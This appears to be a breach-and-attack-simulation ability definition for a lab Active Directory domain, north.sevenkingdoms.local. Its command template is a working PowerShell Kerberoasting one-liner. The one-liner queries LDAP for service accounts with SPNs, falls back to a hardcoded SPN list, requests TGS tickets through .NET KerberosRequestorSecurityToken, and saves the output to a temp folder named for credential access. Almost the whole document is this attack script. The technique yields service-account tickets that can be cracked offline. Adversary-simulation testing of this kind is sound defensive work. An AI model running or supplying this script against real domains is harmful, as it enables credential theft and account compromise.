ability.name: Native PowerShell Kerberoasting
ability.description: Performs native Kerberoasting using .NET KerberosRequestorSecurityToken to request tickets for Active Directory service accounts on north.sevenkingdoms.local.

stages.command_template: $d='C:\Windows\Temp\bas'; if(!(Test-Path "$d\cred_access")){ni -ItemType Directory -Force "$d\cred_access"|out-null}; $(try { Add-Type -AssemblyName System.IdentityModel; $spns = @(); try { $searcher = [ADSISearcher]"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"; $searcher.SearchRoot = [ADSI]"LDAP://192.168.127.11/DC=north,DC=sevenkingdoms,DC=local"; foreach($result in $searcher.FindAll()) { foreach($spn in $result.Properties.serviceprincipalname) { if($spn -notmatch "krbtgt") { $spns += $spn } } } } catch { Write-Output "LDAP search failed: $_. Reverting to fallback SPN list."; $spns = @("MSSQLSvc/sql01.north.sevenkingdoms.local:1433", "HTTP/web01.north.sevenkingdoms.local") }; foreach($spn in $spns) { try { $tgt = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn; Write-Output "Successfully requested TGS for $spn" } catch { Write-Output "Failed for $spn: $_" } } } catch { "ERROR: $_" }) | Tee-Object -FilePath "$d\cred_access\kerberoast_out.txt"

rationale: Queries Active Directory and natively requests ticket-granting service (TGS) tickets for service accounts, saving output to a dedicated file without raw redirection conflicts.
